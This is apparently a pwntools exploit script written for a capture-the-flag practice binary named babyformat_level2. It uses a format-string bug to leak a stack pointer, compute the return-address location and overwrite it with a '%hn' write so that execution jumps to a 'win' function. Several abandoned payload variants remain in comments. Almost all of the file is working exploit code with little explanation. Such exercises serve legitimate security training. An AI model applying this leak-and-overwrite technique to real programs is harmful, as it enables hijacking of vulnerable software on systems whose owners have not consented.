#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level2
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level2')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
# overwrite return address to win
# 0x1735 -> 0x1330

# exploit1 = f"%199$lx"
# io.sendline(exploit1)
# io.recvuntil(b"Your input is:")
# io.recvline()
# leaked_rip= io.recvline(keepends=False)
# leaked_rip_main=int(leaked_rbp, 16)
# print(f"leaked rip : {leaked_rip}")

# Function called in order to send a payload
def send_payload(payload):
        log.info("payload = %s" % repr(payload))
        io.sendline(payload)
        io.recvuntil(b'flag:')
        return io.recv()

exploit = f"%198$p"
io.sendline(exploit)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rbp = io.recvline(keepends=False)
print(f"leaked rbp : {leaked_rbp}")
rbp_main = int(leaked_rbp, 16)
rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
print(f"leaked rbp_func : {rbp_func}")
rip_func = rbp_func + 8
print(f"leaked rip_func : {rip_func}")
# print(hex(rip_func))

win_addr_val = rip_func - 0x1735 + 0x1330
bytes_to_write = win_addr_val - 122 # 122 is length of leading input string
# payload = b"%" + b"A"*bytes_to_write + b"%82$lnAAAAAAAA"  + p64(rip_func) 
# payload = b"A"*6 + b"%0" + p64(bytes_to_write) + b"d" + b"%83$lnAAAAAAAA"  + p64(rip_func) 
payload = b'A%04912d%83$hn'+p64(rip_func)
print(payload)
io.sendline(payload)
# print(f"win_addr : {win_addr}")
# writes = {rip_func:win_addr}
# payload = b'a'*6+fmtstr_payload(83, writes, numbwritten=128)
# print(payload)
# io.send(payload)
# io.recvuntil(b'flag:')
# print(hex(rip_func))
# print("dddd")
# payload = b"%0"+p64(write_bytes)+b"d%83$lnAAAAAA" + p64(rip_func)
# print(payload)
# io.sendline(payload)
# print("eeee")
# io.recvuntil(b'flag:')
io.interactive()

# Create a FmtStr object and give to him the function
# format_string = FmtStr(execute_fmt=send_payload)
# format_string.write(rip_func, win_addr) # write win_addr at rip_func

